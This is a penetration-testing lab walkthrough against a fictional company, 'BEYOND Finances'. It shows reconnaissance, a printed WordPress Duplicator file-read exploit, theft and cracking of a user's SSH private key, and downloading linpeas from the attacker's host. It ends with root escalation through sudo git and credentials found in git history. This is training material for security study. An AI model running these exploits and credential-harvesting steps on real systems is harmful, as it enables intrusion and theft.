
##### Scenario

Company _BEYOND Finances_ has tasked us with conducting a penetration test of their IT infrastructure.
The client wants to determine if an attacker can breach the perimeter and get domain admin privileges in the internal _Active Directory_ (AD) environment.
In this assessment, the client's goals for us are to obtain domain administrator privileges and access the domain controller.

Once you have access to the domain controller, retrieve the NTLM hash of the domain administrator account _BEYOND\\Administrator_ and enter it as answer to this exercise.
> Please make sure you are dumping the NTLM hash of the domain admin user with RID 500 by utilizing dcsync attack via mimikatz not by extracting creds from SAM file.
> The hashes will be different.

## Endpoints

**192.168.x.250** - VM #6 - WINPREP  :  offsec / lab
**192.168.x.242** - VM #3 - MAILSRV1
**192.168.x.244** - VM #5 - WEBSRV1
**172.16.x.240** - VM #1
**172.16.x.243** - VM #4
**172.16.x.241** - VM #2

# Enumerating the public network

Client's provided two initial targets:
- WEBSRV1 - **192.168.x.244**
- MAILSRV1 - **192.168.x.242**

>In a real penetration test, we would also use passive information gathering techniques such as _Google Dorks_ and leaked password databases to obtain additional information.
>This would potentially provide us with usernames, passwords, and sensitive information.

### MAILSRV1 - 242

#### Ports
```bash
sudo nmap -sC -sV -oN nmap 192.168.194.242
	PORT    STATE SERVICE       VERSION
	25/tcp  open  smtp          hMailServer smtpd
	| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
	|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
	80/tcp  open  http          Microsoft IIS httpd 10.0
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-title: IIS Windows Server
	|_http-server-header: Microsoft-IIS/10.0
	110/tcp open  pop3          hMailServer pop3d
	|_pop3-capabilities: TOP USER UIDL
	135/tcp open  msrpc         Microsoft Windows RPC
	139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
	143/tcp open  imap          hMailServer imapd
	|_imap-capabilities: IMAP4 CAPABILITY QUOTA IMAP4rev1 SORT IDLE OK CHILDREN completed RIGHTS=texkA0001 NAMESPACE ACL
	445/tcp open  microsoft-ds?
	587/tcp open  smtp          hMailServer smtpd
	| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
	|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
	Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	|_clock-skew: 8s
	| smb2-time: 
	|   date: 2024-09-05T00:32:11
	|_  start_date: N/A
```
	- sV - Service & version detection
	- sC - Default scripts
	- oN - Output file - Prints up same as stdout results

| Port | Service Version    |
| ---- | ------------------ |
| 25   | hMailServer        |
| 80   | MS IIS httpd 10.0  |
| 110  | hMailServer pop3d  |
| 135  | MS Windows RPC     |
| 139  | MS Windows NetBIOS |
| 143  | hMailServer imapd  |
| 445  | ? ms-ds?           |
| 587  | hMailServer smtpd  |

#### Discovered Services
- Mail Server
- IIS Web Server

#### Mail Server

Searching for hMailServer doesn't yield enough results as we don't get a version from `nmap`  & most all of the listed vulns are old.


#### IIS Web Server

Going to the website shows the standard IIS page

```bash
gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
	===============================================================
	Gobuster v3.6
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://192.168.194.242
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.6
	[+] Extensions:              txt,pdf,config
	[+] Timeout:                 10s
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	Progress: 18456 / 18460 (99.98%)
	===============================================================
	Finished
	===============================================================
```
	- No results


> Not every enumeration technique needs to provide actionable results.
> In the initial information gathering phase, it is important to perform a variety of enumeration methods to get a complete picture of a system.


### WEBSRV1 - 244

> In a real penetration test, we could scan MAILSRV1 and WEBSRV1 in a parallel fashion.
> Meaning, that we could perform the scans at the same time to save valuable time for the client.
> If we do so, it's vital to perform the scans in a structured way to not mix up results or miss findings.

#### Ports
```bash
sudo nmap -sC -sV -oN nmap 192.168.194.244
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
	|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
	80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
	| http-title: BEYOND Finances &#8211; We provide financial freedom
	|_Requested resource was http://192.168.194.244/main/
	|_http-generator: WordPress 6.0.2
	|_http-server-header: Apache/2.4.52 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Port | Service Version        |
| ---- | ---------------------- |
| 22   | OpenSSH 8.9p1 Ubuntu 3 |
| 80   | Apache httpd 2.4.52    |
|      | WordPress 6.0.2        |

Looking up version for port 22 gives us the OS version - Ubuntu Jammy (22.04 LTS)

>We should also search for potential vulnerabilities in Apache 2.4.52 as we did for hMailServer.
>As this will yield no actionable results, we'll skip it.

#### Site mapping

Loading the site in the browser gets us a landing page w/ nothing much going for it.
Viewing the source will yield some other pages:
- /main/feed/
- /main/comments/feed/
- /wp-content/
- /wp-includes/

#### Wappalyzer

|Category|App Version|
|-|-|
|CMS|WordPress 6.0.2|
|Blogs|WordPress 6.0.2|
|Font scripts|Twitter Emoji (Twemoji) 14.0.2<br>Google Font API|
|Miscellaneous|RSS<br>Module Federation 50% sure<br>Webpack 50% sure|
|Web servers|Apache HTTP Server 2.4.52|
|Programming languages|PHP|
|Operating systems|Ubuntu|
|Databases|MySQL|
|Page builder|Elementor 3.7.7|
|JavaScript libraries|jQuery 3.6.0<br>jQuery Migrate 3.3.2<br>Swiper<br>core-js 3.24.1<br>jQuery UI 1.13.1|
|WordPress themes|Hello Elementor 2.6.1|
|WordPress plugins|Contact Form 7 5.6.3<br>Elementor 3.7.7|
|Form builders|Contact Form 7 5.6.3|
- Can confirm
```bash
whatweb 192.168.194.244
	http://192.168.194.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.194.244], RedirectLocation[http://192.168.194.244/main/], UncommonHeaders[x-redirect-by]
	http://192.168.194.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.194.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]
```


- As we can see it uses WP, let's get a scan going
```bash
wpscan --url http://192.168.181.244 --enumerate p --plugins-detection aggressive --api-token <token> -o websrv1/wpscan.log
	         __          _______   _____
	         \ \        / /  __ \ / ____|
	          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
	           \ \/  \/ / |  ___/ \___ \ / __|/ _` | ''_\
	            \  /\  /  | |     ____) | (__| (_| | | | |
	             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
	
	         WordPress Security Scanner by the WPScan Team
	                         Version 3.8.25
	                               
	       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
	_______________________________________________________________
	
	[i] Updating the Database ...
	[i] Update completed.
	
	[+] URL: http://192.168.181.244/ [192.168.181.244]
	[+] Effective URL: http://192.168.181.244/main/
	[+] Started: Thu Sep 12 18:52:09 2024
	
	Interesting Finding(s):
	...
	[i] Plugin(s) Identified:
	
	[+] akismet
	 | Location: http://192.168.181.244/wp-content/plugins/akismet/
	 | Latest Version: 5.3.3
	 ...
	 | The version could not be determined.
	
	[+] classic-editor
	 ...
	 | [!] The version is out of date, the latest version is 1.6.3
	 ...
	 | Version: 1.6.2 (80% confidence)
	 ...
	
	[+] contact-form-7
	 ...
	 | [!] The version is out of date, the latest version is 5.9.8
	 ...
	 | [!] 3 vulnerabilities identified:
	 |
	 | [!] Title: Contact Form 7 < 5.8.4 - Authenticated (Editor+) Arbitrary File Upload
	 |     Fixed in: 5.8.4
	 |     References:
	 |      - https://wpscan.com/vulnerability/70e21d9a-b1e6-4083-bcd3-7c1c13fd5382
	 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6449
	 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/5d7fb020-6acb-445e-a46b-bdb5aaf8f2b6
	 |
	 | [!] Title: Contact Form 7 < 5.9.2 - Reflected Cross-Site Scripting
	 ...
	 | [!] Title:  Contact Form 7 < 5.9.5 - Unauthenticated Open Redirect
	 ...
	 | Version: 5.6.3 (90% confidence)
	 ...
	
	[+] duplicator
	 ...
	 | [!] The version is out of date, the latest version is 1.5.10.2
	 ...
	 | [!] 6 vulnerabilities identified:
	 |
	 | [!] Title: Duplicator 1.3.24 & 1.3.26 - Unauthenticated Arbitrary File Download
	 |     Fixed in: 1.3.28
	 |     References:
	 |      - https://wpscan.com/vulnerability/35227c3a-e893-4c68-8cb6-ffe79115fb6d
	 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11738
	 |      - https://www.exploit-db.com/exploits/49288/
	 |      - https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/
	 |      - https://snapcreek.com/duplicator/docs/changelog/?lite
	 |      - https://snapcreek.com/duplicator/docs/changelog/
	 |      - https://cxsecurity.com/issue/WLB-2021010001
	 |
	 | [!] Title: Duplicator < 1.4.7 - Unauthenticated Backup Download
	 ...
	 | [!] Title: Duplicator < 1.4.7.1 - Unauthenticated System Information Disclosure
	 |     Fixed in: 1.4.7.1
	 |     References:
	 |      - https://wpscan.com/vulnerability/6b540712-fda5-4be6-ae4b-bd30a9d9d698
	 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2552
	 |      - https://github.com/SecuriTrust/CVEsLab/tree/main/CVE-2022-2552
	 |      - https://packetstormsecurity.com/files/167895/
	 |
	 | [!] Title: Duplicator < 1.5.7.1; Duplicator Pro < 4.5.14.2 - Unauthenticated Sensitive Data Exposure
	 |     Fixed in: 1.5.7.1
	 |     References:
	 |      - https://wpscan.com/vulnerability/5c5d41b9-1463-4a9b-862f-e9ee600ef8e1
	 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6114
	 |      - https://research.cleantalk.org/cve-2023-6114-duplicator-poc-exploit
	 |
	 | [!] Title: Duplicator < 1.5.7.1 - Settings Removal via CSRF
	 ...
	 | [!] Title: Duplicator < 1.5.10 - Full Path Disclosure
	 |     Fixed in: 1.5.10
	 |     References:
	 |      - https://wpscan.com/vulnerability/7026d0be-9e57-4ef4-84a2-f7122e36c0cd
	 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6210
	 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/d47d582d-7c90-4f49-aee1-03a8775b850d
	 |
	 | Version: 1.3.26 (80% confidence)
	 ...
	
	[+] elementor
	 ...
	 | [!] The version is out of date, the latest version is 3.24.1
	 ...
	 | [!] 11 vulnerabilities identified:
	 |
	 | [!] Title: Elementor Website Builder < 3.12.2 - Admin+ SQLi
	 ...
	 | [!] Title: Elementor Website Builder < 3.13.2 - Missing Authorization
	 ...
	 | [!] Title: Elementor Website Builder < 3.16.5 - Authenticated (Contributor+) Stored Cross-Site Scripting via get_inline_svg()
	 ...
	 | [!] Title: Elementor Website Builder < 3.16.5 - Missing Authorization to Arbitrary Attachment Read
	 ...
	 | [!] Title: Elementor < 3.18.2 - Contributor+ Arbitrary File Upload to RCE via Template Import
	 |     Fixed in: 3.18.2
	 |     References:
	 |      - https://wpscan.com/vulnerability/a6b3b14c-f06b-4506-9b88-854f155ebca9
	 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-48777
	 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/5b6d0a38-ac28-41c9-9da1-b30b3657b463
	 |
	 | [!] Title: Elementor < 3.19.1 - Authenticated(Contributor+) Arbitrary File Deletion and PHAR Deserialization
	 ...
	 | [!] Title: Elementor Website Builder – More than Just a Page Builder < 3.19.0 - Authenticated (Contributor+) Stored Cross-Site Scripting via get_image_alt
	 ...
	 | [!] Title: Elementor Website Builder < 3.20.3 - Contributor+ DOM Stored XSS
	 ...
	 | [!] Title: Elementor Website Builder < 3.21.6 - Contributor+ DOM Stored XSS
	 ...
	 | [!] Title: Elementor Website Builder < 3.22.2 - Contributor+ Arbitrary SVG Download
	 ...
	 | [!] Title: Elementor Website Builder – More than Just a Page Builder < 3.24.0 - Authenticated (Contributor+) Stored Cross-Site Scripting in the URL Parameter in Multiple Widgets
	 ...
	 | Version: 3.7.7 (100% confidence)
	 ...
	
	[+] wordpress-seo
	 ...
	 | [!] The version is out of date, the latest version is 23.4
	 ...
	 | [!] 3 vulnerabilities identified:
	 |
	 | [!] Title: Yoast SEO < 21.1 - Authenticated (Seo Manager+) Stored Cross-Site Scripting
	 ...
	 | [!] Title: Yoast SEO < 22.6 - Reflected Cross-Site Scripting
	 ...
	 | [!] Title: Yoast SEO < 22.7 - Authenticated (Contributor+) Stored Cross-Site Scripting
	 ...
	 | Version: 19.7.1 (100% confidence)
	 ...
```
	- Plugins id'd:
		- akismet  --> Version not detected
		- classic-editor  --> Out of date  --> v1.6.2
		- contact-form-7  --> Out of date  --> v5.6.3  --> Vulns discovered
		- duplicator  --> Out of date  --> v1.3.26  --> Vulns discovered
		- elementor  --> Out of date  --> v3.7.7  --> Vulns discovered
		- wordpress-seo  --> Out of date  --> 19.7.1  --> Vulns discovered


- Easiest to use **searchsploit** to search for attacks
```bash
searchsploit duplicator 1.3.26
	--------------------------------------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                                                           |  Path
	--------------------------------------------------------------------------------------------------------- ---------------------------------
	Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read                                 | php/webapps/50420.py
	Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit)                    | php/webapps/49288.rb
	WordPress Plugin Duplicator < 1.5.7.1 - Unauthenticated Sensitive Data Exposure to Account Takeover      | php/webapps/51874.py
	--------------------------------------------------------------------------------------------------------- ---------------------------------
	Shellcodes: No Results
	Papers: No Results
```
	- Searching exploits for other plugins didn't yield much of anything.


# Attacking a Public Machine

### WEBSRV1 - 244

#### Initial foothold

- Utilize **searchsploit** result `Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read | php/webapps/50420.py`
```bash
# Download exploit
searchsploit -m 50420.py

# Rename for clarity
mv 50420.py 50420_fileread.py

# Check file to know what it's doing & check for malicious shellcode
cat 50420_fileread.py
	# Exploit Title: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
	# ...
	
	import requests as re
	import sys
	
	if len(sys.argv) != 3:
	        print("Exploit made by nam3lum.")
	        print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
	        exit()
	
	arg = sys.argv[1]
	file = sys.argv[2]
	
	URL = arg + "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../.." + file
	
	output = re.get(url = URL)
	print(output.text)
```

- Use to attempt exploit
```bash
python3 50420_fileread.py http://192.168.181.244 /etc/passwd
	root:x:0:0:root:/root:/bin/bash
	...
	offsec:x:1000:1000:offsec:/home/offsec:/bin/bash
	...
	mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
	ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
	daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
	marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
```
	- Add these to your creds text/ notes


- With this info, we can attempt to retrieve any ssh keys from these users
```bash
python3 50420_fileRead.py http://192.168.181.244 /home/marcus/.ssh/id_rsa
	Invalid installer file name!!
 
python3 50420_fileRead.py http://192.168.181.244 /home/marcus/.ssh/id_ecdsa
	Invalid installer file name!!
  
python3 50420_fileRead.py http://192.168.181.244 /home/daniela/.ssh/id_rsa
	-----BEGIN OPENSSH PRIVATE KEY-----
	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
	QduOTpMIvVMIJcfeYF1GJ4ggUG4=
	-----END OPENSSH PRIVATE KEY-----
```
	- Save key in its own file - ex: daniela_idrsa

- Use key to attempt to access WEBSRV1
```bash
chmod 600 daniela_idrsa

ssh -i daniela_idrsa daniela@192.168.181.244
	The authenticity of host '192.168.181.244 (192.168.181.244)' can''t be established.
	ED25519 key fingerprint is SHA256:vhxi+CCQgvUHPEgu5nTN85QQZihXqJCE34zq/OU48VM.
	This key is not known by any other names.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '192.168.181.244' (ED25519) to the list of known hosts.
	Enter passphrase for key 'daniela_idrsa': 
```

- Attempt to crack the passphrase w/ [ssh2john](CheatSheet.md#Cracking%20ssh%20key%20passcodes)
```bash
ssh2john daniela_idrsa > ssh.hash           

john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash 
	...
	tequieromucho    (daniela_idrsa)     
	...
```

- Use key to gain access to WEBSRV1
```bash
ssh -i daniela_idrsa daniela@192.168.181.244
	Enter passphrase for key 'daniela_idrsa':   [tequieromucho]
		Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-50-generic x86_64)
		
		 * Documentation:  https://help.ubuntu.com
		 * Management:     https://landscape.canonical.com
		 * Support:        https://ubuntu.com/advantage
		
		  System information as of Fri Sep 13 12:44:45 AM UTC 2024
		
		  System load:  0.080078125       Processes:               206
		  Usage of /:   73.8% of 8.02GB   Users logged in:         0
		  Memory usage: 21%               IPv4 address for ens192: 192.168.181.244
		  Swap usage:   0%
		
		 * Super-optimized for small spaces - read how we shrank the memory
		   footprint of MicroK8s to make it the smallest full K8s around.
		
		   https://ubuntu.com/blog/microk8s-memory-optimisation
		
		13 updates can be applied immediately.
		To see these additional updates run: apt list --upgradable
		
		
		The list of available updates is more than a week old.
		To check for new updates run: sudo apt update
		
		Last login: Wed Nov  2 09:57:32 2022 from 192.168.118.5
		daniela@websrv1:~$ whoami
			daniela
``` 


#### Local enumeration

- Auto enum.
- Setup a python server for exploits and download **linpeas.sh** to victim & run
```bash
wget http://192.168.45.193/linpeas.sh
	--2024-09-13 01:00:28--  http://192.168.45.193/linpeas.sh
	Connecting to 192.168.45.193:80... connected.
	HTTP request sent, awaiting response... 200 OK
	Length: 823059 (804K) [text/x-sh]
	Saving to: ‘linpeas.sh’
	
	linpeas.sh                         100%[===============================================================>] 803.77K  1.10MB/s    in 0.7s    
	
	2024-09-13 01:00:28 (1.10 MB/s) - ‘linpeas.sh’ saved [823059/823059]

chmod +x linpeas.sh

./linpeas.sh
```

##### Results:

```bash
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                         
                              ╚════════════════════╝                                                                                       
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                         
Linux version 5.15.0-50-generic (buildd@lcy02-amd64-086) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #56-Ubuntu SMP Tue Sep 20 13:23:26 UTC 2022
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.1 LTS
Release:        22.04
Codename:       jammy
```

```bash
                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                        
                              ╚═════════════════════╝                                                                                      
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                        
link-local 169.254.0.0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:bf:ae:a2 brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 192.168.181.244/24 brd 192.168.181.255 scope global ens192
       valid_lft forever preferred_lft forever
```
	- As there's only 1 interface outside of loopback, we can tell it's not attached to an internal network and won't be able to be used as a pivot point

```bash
                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                        
                               ╚═══════════════════╝                                                                                       
...    
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                           
Matching Defaults entries for daniela on websrv1:                                                                                          
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git
```
	- Can verify w/ `sudo -l`

```bash
                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                         
                             ╚══════════════════════╝                              
...
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27  2022 /srv/www/wordpress/wp-config.php                                                          
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
...

╔══════════╣ Analyzing Github Files (limit 70)
drwxr----- 8 root root 4096 Oct  4  2022 /srv/www/wordpress/.git
```
	- Note & store pw info ^
	- Also note that install path is not /var/www/html BUT is in /srv/www/wordpress/
	- Reviewing the git repo can yield changes in config data or sensitive info

> Checking git repo as `daniela` won't work:
```bash
daniela@websrv1:/srv/www/wordpress$ la
	.git       license.txt      wp-admin              wp-config.php         wp-cron.php        wp-load.php   wp-settings.php  wp-trackback.php
	.htaccess  readme.html      wp-blog-header.php    wp-config-sample.php  wp-includes        wp-login.php  wp-signup.php    xmlrpc.php
	index.php  wp-activate.php  wp-comments-post.php  wp-content            wp-links-opml.php  wp-mail.php   wp-snapshots
daniela@websrv1:/srv/www/wordpress$ git status
	fatal: not a git repository (or any of the parent directories): .git
```
> But elevating to `root` will work.


- Check [GTFOBins](https://gtfobins.github.io/gtfobins) for `git` exploits
```bash
sudo git -p help config

# Once : prompt is shown
!/bin/sh
	# whoami
		root
```

- Review git repo
```bash
cd /srv/www/wordpress

git status
	HEAD detached at 612ff57
	nothing to commit, working tree clean

git log
	commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
	Author: root <root@websrv1>
	Date:   Tue Sep 27 14:26:15 2022 +0000
	
	    Removed staging script and internal network access
	
	commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
	Author: root <root@websrv1>
	Date:   Tue Sep 27 14:24:28 2022 +0000
	
	    initial commit

git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000

    Removed staging script and internal network access

diff --git a/fetch_current.sh b/fetch_current.sh
	deleted file mode 100644
	index 25667c7..0000000
	--- a/fetch_current.sh
	+++ /dev/null
	@@ -1,6 +0,0 @@
	-#!/bin/bash
	-
	-# Script to obtain the current state of the web app from the staging server
	-
	-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
```
	- Add creds to notes

> Once privs are elevated, running linpeas again might yield more results now we're root